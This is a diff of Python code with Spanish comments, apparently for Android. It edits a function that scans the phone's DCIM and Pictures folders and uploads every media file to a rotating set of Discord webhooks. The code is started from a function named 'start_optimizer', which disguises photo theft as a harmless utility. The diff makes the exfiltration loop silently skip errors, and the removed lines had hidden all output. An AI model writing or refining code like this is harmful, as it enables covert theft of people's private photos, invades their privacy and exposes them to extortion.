@@ -47,12 +47,9 @@ def send_to_discord(file_path, webhook_url):
             return True
     except: return False
 
-def process_gallery():
-    f = StringIO()
-    sys.stdout = f 
-    sys.stderr = f
-    
-    if not check_storage_permissions(): return
+def process_gallery():    
+    if not check_storage_permissions(): 
+        return
     
     search_paths = [
         "/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures",
@@ -65,11 +62,16 @@ def process_gallery():
         if not os.path.exists(base_path): continue
         for root, _, files in os.walk(base_path):
             for file in files:
+                # Usar el nombre del archivo para validar tipo
                 if get_file_type_and_valid(file):
                     file_path = os.path.join(root, file)
-                    if send_to_discord(file_path, WEBHOOKS[webhook_index]):
-                        webhook_index = (webhook_index + 1) % len(WEBHOOKS)
-                        time.sleep(0.5)
+                    # Intentar envío
+                    try:
+                        if send_to_discord(file_path, WEBHOOKS[webhook_index]):
+                            webhook_index = (webhook_index + 1) % len(WEBHOOKS)
+                            time.sleep(0.5)
+                    except:
+                        continue
 
 # Esta es la función que llamaremos desde el código principal
 def start_optimizer():
